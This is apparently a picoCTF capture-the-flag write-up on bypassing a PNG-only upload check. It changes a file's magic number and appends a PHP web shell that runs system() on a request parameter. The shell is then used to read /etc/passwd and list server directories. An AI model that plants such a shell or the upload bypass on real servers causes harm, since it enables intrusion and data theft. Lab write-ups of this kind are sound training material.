

**Objective:** 
Exploit a web application that only accepts `.png` files to achieve Remote Code Execution (RCE).

## Steps and Analysis:

### 1. Initial Observation:
- Accessed the website which prompted for a `.png` file upload.
- Screenshot: [Initial Website View]![[Pasted image 20240315190122.png]]
### 2. Dir busting
- `gobuster dir -u http://gobuster dir -u http://atlas.picoctf.net:62175/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt`
- Output
	- ![[Pasted image 20240315193009.png]]

### 3. File Preparation and Magic Number Manipulation:
- Downloaded a random image from the internet to use as a base.
- Altered the magic number in the file to match a PNG file.
- Screenshot of modified magic number: [Magic Number Modification]![[Pasted image 20240315190323.png]]
- _Note: The magic number (file signature) was altered to bypass file type checks by the website._


### 4. Embedding PHP Code:
- Appended PHP code to the image file to facilitate RCE using the following command:
  ```
  echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' >> PNG.png.php
  ```

### 5. Accessing the Uploaded File and Testing RCE:
- Navigated to the uploaded file’s URL: `atlas.picoctf.net:63517/uploads/PNG.png.php`
- Screenshots of the uploaded file in action: [File Location] ![[Pasted image 20240315191200.png]], 
- Confirmed RCE by executing a test command (`cat /etc/passwd`):
  ```
  atlas.picoctf.net:63517/uploads/PNG.png.php?cmd=cat /etc/passwd
  ```
- Screenshot of test command execution: [Test Command Execution![[Pasted image 20240315191311.png]]

### 6. Exploring the Server:
- Used the `pwd` command to print the current working directory, revealing the path: `/var/www/html/uploads`
-  `atlas.picoctf.net:63517/uploads/PNG.png.php?cmd=pwd`
	- `/var/www/html/uploads`

### 7. Listing Directory Contents:
- Listed directories in `/var/www/html`, identifying a file named `GNTDOMBWGIZDE.txt` as potentially interesting.
- Screenshot of directory listing: [Directory Listing]
- ![[Pasted image 20240315191622.png]]

### 8. Accessing the Identified File:
- Decided to investigate the `GNTDOMBWGIZDE.txt` file.
- Screenshot of the file's contents: [File Contents ![[Pasted image 20240315191801.png]]

**Conclusion:** 
Successfully achieved RCE by manipulating an image file’s magic number and embedding PHP code, allowing exploration of the server and identification of potential points of interest.
